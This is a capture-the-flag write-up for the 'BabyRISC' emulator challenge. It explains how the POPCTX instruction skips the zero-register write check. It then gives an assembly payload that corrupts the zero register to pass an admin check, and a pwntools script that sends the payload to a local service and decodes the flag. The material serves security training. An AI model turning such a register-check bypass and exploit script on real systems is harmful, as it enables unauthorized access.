ShabakCTF Challenge: "BabyRISC"

Published: 08.11.2026

Description of the challenge:
Following ARM's success, I went ahead and designed my own RISC assembly language.
I wrote an emulator, so you'll be able to run your own programs and enjoy the (very) reduced instruction set!
Of course, with such minimal implementation, reading the flag is impossible.


In this challange, We get the binary, the source and a Dockerfile - so no need for a decompiler this time, we just read the C.

Instructions like ADDI, SUBI, MUL, PUSH/POP work on one register at a time, but PUSHCTX/POPCTX push and pop all the registers together, as one block on the stack. keep that in mind, its the important part later. this is all the opcodes we have- each one is a function by itself, so those are just the names:

the admin code (made in generate_admin_code) seems intresting, it checks something - lets take a look at main.c at the generate_admin_code function: 

// If the user sets R0 so (R0 * 42) == 1 (impossible!), she deserves to read the flag

So we understand it firstly generates admin code and then reads our code - so its admin code then our code - mabey we can change some things the admin code set, but first lets understand what the admin code generates: 

R1 = $0 + 42	// meaning: R1 = 42
R2 = R0*R1 	// meaning: R2 = R0*42
R2 = R2-1
if R2!=0
	return	//meaing: exit
else
	prints the flag

So to get the flag we understand we basiclly need to pass the check: R0*42 == 1 -> flag printed - problem solved?
No. The check itself is impossible to pass. Although we can control R0 register, it wont help - we need some how to make smth * 42 to be 1.
The only option is overflow, but when we check, the program works on 32 bit - meaning we wont be able to get to 1, only even numbers...
We also cant just change $0 to smth else since it has a securoty check for it, and if its changed then the program exits, lets see why (in asm_processor_state.c): 

int write_reg(asm_register_t reg, reg_value_t value)
{
    if (reg < 0 || reg >= sizeof(registers) / sizeof(reg_value_t))
    {
        return E_W_INVLD_REG;
    }
    else if (reg == ASM_REGISTER_ZERO)
    {
        return E_W2ZERO;
    }

    registers[reg] = value;
    return E_SUCCESS;
}

We can see the line that checks $0: 

    else if (reg == ASM_REGISTER_ZERO)
    {
        return E_W2ZERO;
    }

This part checks if $0 is written to, if so it sends error. now all the opcodes uses this security check.. besides one: 

INSTRUCTION_DEFINE_OP0(POPCTX)
{
    int ret = E_SUCCESS;
    reg_value_t sp_val = 0;

    ret = read_reg(ASM_REGISTER_SP, &sp_val);
    if (ret != E_SUCCESS)
    {
        goto cleanup;
    }

    if (sp_val < (reg_value_t)sizeof(registers) || sp_val > (reg_value_t)ASM_STACK_SIZE)
    {
        ret = E_STACK_VIOLATION;
        goto cleanup;
    }

    sp_val -= sizeof(registers);
    memcpy(registers, &asm_stack[sp_val], sizeof(registers));

cleanup:
    return ret;
}

We can see that an intresting instruction, what it does is the opposite of pushctx whcoh push all regsiters exist in this program to the stack together, while popctx pop it all back - meaning its writing back to the regsiter same order. The problem? It's writing to registers including $0 with no securoty check we mentioned before. We can exploit it to be able to change $0 and that means we could get the flag!
Forgot to mention we are given a ready payload file that helps us generate opcodes in babyRisc assembly in payload_builder/build_payload.c .

So we need to do the follow: 

SUBI    R0, ZERO, 41 	//r0 = -41->later $0=-41
ADDI    R1, ZERO, 1	//r1 = 1->later r0=1
ADDI    R2, ZERO, 0	//r2 = 0->later r1=0
ADDI    R3, ZERO, 0	//r3 = 0->later r2=0
PUSHCTX			// push all registers to stack
PUSH    R2		//make the stack pointer go up by one (R1->$0,R2->R1...)
POPCTX			// pop to all registers from stack, with the corupted values so it'll print flag.

This is the payload - what i changed in build_paylod.c:

// Fill some registers and return

after we compile it we get the payload, now we need to send it to the program. Here is the script (exploit) i wrote: 

from pwn import *

with open('payload_builder/build_payload_cp/payload.bin', 'rb') as f:
	payload = f.read()
c = remote('localhost',9020)
c.send(payload)
c.recvuntil(b"Executing code!")
raw_data = c.recvall()

data_stripped = raw_data.split(b">>>")[0].replace(b"\x1b[0m",b"").strip()
ldata = []
for i in range(0,len(data_stripped),4):
    chunk = data_stripped[i:i+4]
    if(len(chunk) >0):
        ldata.append(chunk.ljust(4,b'\x00'))

flag = b""
for d in ldata:
    flag+=p32(u32(d)+41)
print("------")
print(flag.split(b'\x00')[0])
print("------")
c.interactive()

every 4 bytes the admin code prints is off by the same -41 we loaded into R0 at the start, so adding 41 back to every chunk when we parse it gives us back the real flag bytes.
